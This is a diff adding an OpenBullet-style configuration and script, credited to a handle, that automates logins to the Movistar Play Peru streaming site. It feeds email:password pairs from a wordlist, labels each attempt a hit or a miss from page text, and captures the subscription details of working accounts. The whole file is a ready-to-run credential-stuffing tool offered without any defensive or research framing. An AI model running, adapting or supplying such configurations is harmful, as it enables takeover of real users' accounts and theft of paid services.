@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "MovistarPlay-Peru",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-19T18:19:37.1473232-05:00",
+  "AdditionalInfo": "",
+  "Author": "🔥𝕃𝔼𝕆ℕ𝕀𝔻𝔸𝕊🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+BROWSERACTION ClearCookies 
+
+NAVIGATE "https://www.movistarplay.com.pe/" 
+
+#DELAY FUNCTION Delay "1000" -> VAR "DELAY" 
+
+#INICIAR_SESION ELEMENTACTION XPath "/html/body/go-mdl-layout-cmp-main/header/div/go-mdl-authentication-cmp-login-button/div/p/a" 
+  Click 
+
+#DELAY FUNCTION Delay "1000" -> VAR "DELAY" 
+
+#CORREO ELEMENTACTION XPath "/html/body/div[1]/div/div/div/div[2]/div/form[1]/div/div[3]/input" 
+  SendKeys "<USER>" 
+
+#PASS ELEMENTACTION XPath "/html/body/div[1]/div/div/div/div[2]/div/form[1]/div/div[4]/input" 
+  SendKeys "<PASS>" 
+
+#SUBMIT ELEMENTACTION XPath "/html/body/div[1]/div/div/div/div[2]/div/form[1]/div/div[5]/button" 
+  Submit 
+
+#DELAY FUNCTION Delay "3000" -> VAR "DELAY" 
+
+#EXITO ELEMENTACTION XPath "/html/body/div[1]/div/div/div/div[2]/div/form[1]/div/div[1]/span" 
+  GetText -> CAP "EXITO" 
+
+#ERROR ELEMENTACTION XPath "/html/body/div[1]/div/div/div/div[2]/div/form[1]/div/div[2]/span" 
+  GetText -> VAR "ERROR" 
+
+#MEIL ELEMENTACTION XPath "/html/body/go-mdl-layout-cmp-main/header/div/go-mdl-authentication-cmp-login-button/div/p/span" 
+  GetText -> VAR "MEIL" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<EXITO>" Contains "contraseña" 
+    KEY "<ERROR>" Contains "formato" 
+  KEYCHAIN Success OR 
+    KEY "<EXITO>" Contains "disponible" 
+    KEY "<MEIL>" Contains "@" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<EXITO>" Contains "usuario" 
+    KEY "<EXITO>" Contains "email" 
+
+NAVIGATE "https://www.movistarplay.com.pe/settings/my-subscriptions" 
+
+FUNCTION Delay "4000" 
+
+ELEMENTACTION XPath "/html/body/go-mdl-layout-cmp-main/main/div/go-mdl-settings-cmp-settings-main/div/div/go-mdl-settings-cmp-settings-subscriptions/section[1]/div/go-cmp-subscription-box/div/div[2]/a[1]" Recursive=TRUE 
+  GetText -> CAP "SUSCRIPCION" 
+
+ELEMENTACTION XPath "/html/body/go-mdl-layout-cmp-main/main/div/go-mdl-settings-cmp-settings-main/div/div/go-mdl-settings-cmp-settings-subscriptions/section[1]/div/p" 
+  GetText -> CAP "CUSTOM" 
+
+BROWSERACTION Close 
+
